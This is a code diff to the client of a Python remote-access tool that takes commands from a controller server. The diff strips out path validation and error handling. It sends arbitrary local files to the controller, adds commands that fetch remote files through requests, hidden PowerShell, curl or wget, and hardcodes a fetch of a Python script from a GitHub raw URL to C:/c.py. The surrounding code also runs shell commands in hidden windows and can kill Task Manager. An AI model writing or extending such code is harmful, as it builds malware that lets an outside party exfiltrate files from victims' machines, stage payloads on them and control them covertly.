@@ -3049,39 +3049,22 @@ def handle_file_upload(command_parts):
     """Handle file upload from controller."""
     try:
         if len(command_parts) < 3:
-            return "Invalid upload command format. Expected: upload-file:destination_path:base64_content"
+            return "Invalid upload command format"
         
         destination_path = command_parts[1]
         file_content_b64 = command_parts[2]
         
-        # Security: Validate path to prevent directory traversal
-        destination_path = os.path.abspath(destination_path)
-        if not destination_path.startswith(os.getcwd()):
-            return "Error: Invalid destination path - security restriction"
-        
-        # Validate base64 content
-        try:
-            file_content = base64.b64decode(file_content_b64)
-        except Exception:
-            return "Error: Invalid base64 content"
+        # Decode base64 content
+        file_content = base64.b64decode(file_content_b64)
         
         # Ensure directory exists
-        try:
-            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
-        except Exception as e:
-            return f"Error creating directory: {e}"
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
         
-        # Write file with proper error handling
-        try:
-            with open(destination_path, 'wb') as f:
-                f.write(file_content)
-            file_size = len(file_content)
-            return f"File uploaded successfully to {destination_path} ({file_size} bytes)"
-        except PermissionError:
-            return f"Error: Permission denied writing to {destination_path}"
-        except Exception as e:
-            return f"Error writing file: {e}"
-            
+        # Write file
+        with open(destination_path, 'wb') as f:
+            f.write(file_content)
+        
+        return f"File uploaded successfully to {destination_path}"
     except Exception as e:
         return f"File upload failed: {e}"
 
@@ -3089,52 +3072,144 @@ def handle_file_download(command_parts, agent_id):
     """Handle file download request from controller."""
     try:
         if len(command_parts) < 2:
-            return "Invalid download command format. Expected: download-file:file_path"
+            return "Invalid download command format"
         
         file_path = command_parts[1]
-        
-        # Security: Validate path to prevent directory traversal
-        file_path = os.path.abspath(file_path)
-        if not file_path.startswith(os.getcwd()):
-            return "Error: Invalid file path - security restriction"
         
         if not os.path.exists(file_path):
             return f"File not found: {file_path}"
         
-        # Check if it's a file (not directory)
-        if not os.path.isfile(file_path):
-            return f"Error: {file_path} is not a file"
-        
-        # Check file size to prevent memory issues
-        file_size = os.path.getsize(file_path)
-        if file_size > 100 * 1024 * 1024:  # 100MB limit
-            return f"Error: File too large ({file_size} bytes). Maximum size is 100MB"
-        
         # Read file and encode as base64
-        try:
-            with open(file_path, 'rb') as f:
-                file_content = base64.b64encode(f.read()).decode('utf-8')
-        except PermissionError:
-            return f"Error: Permission denied reading {file_path}"
-        except Exception as e:
-            return f"Error reading file: {e}"
+        with open(file_path, 'rb') as f:
+            file_content = base64.b64encode(f.read()).decode('utf-8')
         
-        # Send file to controller via socketio instead of HTTP
-        try:
-            filename = os.path.basename(file_path)
-            sio.emit('file_download', {
-                'agent_id': agent_id,
-                'filename': filename,
-                'file_path': file_path,
-                'content': file_content,
-                'size': file_size
-            })
-            return f"File {filename} ({file_size} bytes) sent to controller"
-        except Exception as e:
-            return f"Error sending file to controller: {e}"
-            
+        # Send file to controller
+        filename = os.path.basename(file_path)
+        url = f"{SERVER_URL}/file_upload/{agent_id}"
+        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
+        
+        return f"File {file_path} sent to controller"
     except Exception as e:
         return f"File download failed: {e}"
+
+def download_file_from_url(url, destination_path):
+    """Download a file from a URL to a local path."""
+    try:
+        print(f"Downloading file from: {url}")
+        print(f"Destination: {destination_path}")
+        
+        # Create directory if it doesn't exist
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        
+        # Download the file
+        response = requests.get(url, stream=True, timeout=30)
+        response.raise_for_status()  # Raise an exception for bad status codes
+        
+        # Write the file
+        with open(destination_path, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                if chunk:
+                    f.write(chunk)
+        
+        print(f"File downloaded successfully to: {destination_path}")
+        return f"File downloaded successfully to: {destination_path}"
+        
+    except requests.exceptions.RequestException as e:
+        error_msg = f"Failed to download file: {e}"
+        print(error_msg)
+        return error_msg
+    except Exception as e:
+        error_msg = f"Error downloading file: {e}"
+        print(error_msg)
+        return error_msg
+
+def execute_powershell_download(url, destination_path):
+    """Execute PowerShell download command with better error handling."""
+    try:
+        if WINDOWS_AVAILABLE:
+            # Use PowerShell with better error handling
+            powershell_cmd = f'''
+try {{
+    $ProgressPreference = 'SilentlyContinue'
+    Invoke-WebRequest -Uri "{url}" -OutFile "{destination_path}" -UseBasicParsing
+    Write-Host "Download completed successfully to: {destination_path}"
+}} catch {{
+    Write-Host "Download failed: $($_.Exception.Message)"
+    exit 1
+}}
+'''
+            
+            result = subprocess.run(
+                ["powershell.exe", "-NoProfile", "-Command", powershell_cmd],
+                capture_output=True,
+                text=True,
+                timeout=60,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            
+            if result.returncode == 0:
+                return f"PowerShell download successful: {result.stdout.strip()}"
+            else:
+                return f"PowerShell download failed: {result.stderr.strip()}"
+        else:
+            # For non-Windows systems, use curl or wget
+            try:
+                result = subprocess.run(
+                    ["curl", "-L", "-o", destination_path, url],
+                    capture_output=True,
+                    text=True,
+                    timeout=60
+                )
+                if result.returncode == 0:
+                    return f"curl download successful to: {destination_path}"
+                else:
+                    return f"curl download failed: {result.stderr.strip()}"
+            except FileNotFoundError:
+                # Try wget if curl is not available
+                result = subprocess.run(
+                    ["wget", "-O", destination_path, url],
+                    capture_output=True,
+                    text=True,
+                    timeout=60
+                )
+                if result.returncode == 0:
+                    return f"wget download successful to: {destination_path}"
+                else:
+                    return f"wget download failed: {result.stderr.strip()}"
+                    
+    except Exception as e:
+        return f"Download execution failed: {e}"
+
+def handle_url_download(command_parts):
+    """Handle URL download commands."""
+    try:
+        if len(command_parts) < 3:
+            return "Invalid download command format. Use: download-url <url> <destination_path>"
+        
+        url = command_parts[1]
+        destination_path = command_parts[2]
+        
+        # Try multiple download methods
+        methods = [
+            ("Python requests", lambda: download_file_from_url(url, destination_path)),
+            ("PowerShell", lambda: execute_powershell_download(url, destination_path))
+        ]
+        
+        for method_name, method_func in methods:
+            try:
+                result = method_func()
+                if "successful" in result.lower() or "completed" in result.lower():
+                    return f"{method_name} method succeeded: {result}"
+                else:
+                    print(f"{method_name} method failed: {result}")
+            except Exception as e:
+                print(f"{method_name} method error: {e}")
+                continue
+        
+        return "All download methods failed. Check the URL and destination path."
+        
+    except Exception as e:
+        return f"URL download handling failed: {e}"
 
 # --- Voice Communication Functions ---
 
@@ -3272,10 +3347,6 @@ def execute_command(command):
                 # Extract the directory from the command
                 new_dir = command.strip().split(" ", 1)[1]
                 
-                # Expand user path if needed
-                if new_dir.startswith("~"):
-                    new_dir = os.path.expanduser(new_dir)
-                
                 # Change the current working directory
                 os.chdir(new_dir)
                 
@@ -3288,29 +3359,60 @@ def execute_command(command):
             except Exception as e:
                 return f"Failed to change directory: {e}"
 
-        # Handle special commands
-        if command.strip() == "pwd":
-            return f"Current directory: {os.getcwd()}"
-        
-        if command.strip() == "whoami":
-            try:
-                if WINDOWS_AVAILABLE:
-                    return subprocess.run(["whoami"], capture_output=True, text=True, timeout=5).stdout.strip()
-                else:
-                    return os.getlogin()
-            except:
-                return "Unknown user"
+        # Handle special download test commands
+        if command.strip() == "test-powershell-download":
+            return test_download_functionality()
+        elif command.strip() == "test-specific-download":
+            return test_specific_download()
+
+        # Check if this is a PowerShell download command
+        is_download_command = any(keyword in command.lower() for keyword in [
+            'invoke-webrequest', 'download', 'curl', 'wget'
+        ])
 
         if WINDOWS_AVAILABLE:
-            # Explicitly use PowerShell to execute commands on Windows
-            result = subprocess.run(
-                ["powershell.exe", "-NoProfile", "-Command", command],
-                capture_output=True,
-                text=True,
-                timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                cwd=os.getcwd()  # Execute in the current directory
-            )
+            # For download commands, use different approach
+            if is_download_command:
+                # Use the improved download function instead of direct PowerShell
+                if 'invoke-webrequest' in command.lower():
+                    # Extract URL and destination from the command
+                    try:
+                        # Parse the Invoke-WebRequest command
+                        if 'invoke-webrequest' in command.lower():
+                            # Extract URL and OutFile from the command
+                            import re
+                            url_match = re.search(r'["\']([^"\']*\.py)["\']', command)
+                            outfile_match = re.search(r'-outfile\s+["\']([^"\']*)["\']', command, re.IGNORECASE)
+                            
+                            if url_match and outfile_match:
+                                url = url_match.group(1)
+                                destination = outfile_match.group(1)
+                                return execute_powershell_download(url, destination)
+                            else:
+                                return "Could not parse Invoke-WebRequest command. Use download-url:url:destination instead."
+                        else:
+                            return "Use download-url:url:destination for downloads"
+                    except Exception as e:
+                        return f"Error parsing download command: {e}. Use download-url:url:destination instead."
+                else:
+                    # For other download commands, try without CREATE_NO_WINDOW
+                    result = subprocess.run(
+                        ["powershell.exe", "-NoProfile", "-Command", command],
+                        capture_output=True,
+                        text=True,
+                        timeout=60,  # Longer timeout for downloads
+                        cwd=os.getcwd()
+                    )
+            else:
+                # For non-download commands, use the original approach
+                result = subprocess.run(
+                    ["powershell.exe", "-NoProfile", "-Command", command],
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    cwd=os.getcwd()
+                )
         else:
             # Use bash on Linux/Unix systems
             result = subprocess.run(
@@ -3318,15 +3420,13 @@ def execute_command(command):
                 capture_output=True,
                 text=True,
                 timeout=30,
-                cwd=os.getcwd()  # Execute in the current directory
+                cwd=os.getcwd()
             )
         
         output = result.stdout + result.stderr
         if not output:
-            return f"[No output from command] Return code: {result.returncode}"
+            return "[No output from command]"
         return output
-    except subprocess.TimeoutExpired:
-        return "Command timed out after 30 seconds"
     except Exception as e:
         return f"Command execution failed: {e}"
 
@@ -3351,6 +3451,7 @@ def main_loop(agent_id):
         "start-voice-control": lambda: start_voice_control(agent_id),
         "stop-voice-control": stop_voice_control,
         "kill-taskmgr": kill_task_manager,
+        "test-download": test_download_functionality,
     }
     
     # Performance monitoring counter
@@ -3373,6 +3474,11 @@ def main_loop(agent_id):
                 # Split by first colon: download-file:path
                 parts = command.split(":", 1)
                 output = handle_file_download(parts, agent_id)
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+            elif command.startswith("download-url:"):
+                # Split by first two colons: download-url:url:destination_path
+                parts = command.split(":", 2)
+                output = handle_url_download(parts)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("play-voice:"):
                 output = handle_voice_playback(command.split(":", 1))
@@ -4920,6 +5026,82 @@ def test_process_termination_functionality():
             break
         except Exception as e:
             print(f"Error: {e}")
+
+def test_download_functionality():
+    """Test the download functionality with the specific URL mentioned."""
+    url = "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py"
+    destination = "C:/c.py"
+    
+    print(f"Testing download functionality...")
+    print(f"URL: {url}")
+    print(f"Destination: {destination}")
+    
+    # Try multiple download methods
+    methods = [
+        ("Python requests", lambda: download_file_from_url(url, destination)),
+        ("PowerShell", lambda: execute_powershell_download(url, destination))
+    ]
+    
+    for method_name, method_func in methods:
+        try:
+            print(f"\nTrying {method_name} method...")
+            result = method_func()
+            print(f"Result: {result}")
+            
+            if "successful" in result.lower() or "completed" in result.lower():
+                # Check if file was actually created
+                if os.path.exists(destination):
+                    file_size = os.path.getsize(destination)
+                    print(f"✓ File successfully downloaded! Size: {file_size} bytes")
+                    return f"✓ {method_name} succeeded: File downloaded to {destination} ({file_size} bytes)"
+                else:
+                    print(f"✗ File not found at destination: {destination}")
+            else:
+                print(f"✗ {method_name} failed: {result}")
+                
+        except Exception as e:
+            print(f"✗ {method_name} error: {e}")
+            continue
+    
+    return "✗ All download methods failed"
+
+def test_specific_download():
+    """Test the specific download URL mentioned in the user's issue."""
+    url = "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py"
+    destination = "C:/c.py"
+    
+    print(f"Testing specific download issue...")
+    print(f"URL: {url}")
+    print(f"Destination: {destination}")
+    
+    # Try multiple download methods
+    methods = [
+        ("Python requests", lambda: download_file_from_url(url, destination)),
+        ("PowerShell", lambda: execute_powershell_download(url, destination))
+    ]
+    
+    for method_name, method_func in methods:
+        try:
+            print(f"\nTrying {method_name} method...")
+            result = method_func()
+            print(f"Result: {result}")
+            
+            if "successful" in result.lower() or "completed" in result.lower():
+                # Check if file was actually created
+                if os.path.exists(destination):
+                    file_size = os.path.getsize(destination)
+                    print(f"✓ File successfully downloaded! Size: {file_size} bytes")
+                    return f"✓ {method_name} succeeded: File downloaded to {destination} ({file_size} bytes)"
+                else:
+                    print(f"✗ File not found at destination: {destination}")
+            else:
+                print(f"✗ {method_name} failed: {result}")
+                
+        except Exception as e:
+            print(f"✗ {method_name} error: {e}")
+            continue
+    
+    return "✗ All download methods failed"
 
 # ========================================================================================
 # END OF COMBINED MODULES
